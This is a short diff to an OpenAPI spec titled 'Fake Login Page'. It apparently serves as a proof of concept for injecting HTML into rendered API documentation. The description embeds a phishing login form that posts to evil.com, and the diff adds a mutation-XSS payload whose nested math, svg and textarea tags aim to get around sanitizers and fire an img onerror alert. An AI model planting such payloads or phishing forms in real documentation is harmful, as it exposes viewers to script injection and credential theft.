@@ -3,7 +3,8 @@ info:
   version: 1.0.0
   title: "Login Page - Fake Login Page"
   description: |
-    we move our service to <a href="https://www.evil.com">gator.com</a>
+      <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+    // we move our service to <a href="https://www.evil.com">gator.com</a>
     <div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
@@ -49,4 +50,5 @@ paths:
           description: Invalid credentials or missing parameters
         '500':
           description: Internal server error
+
 
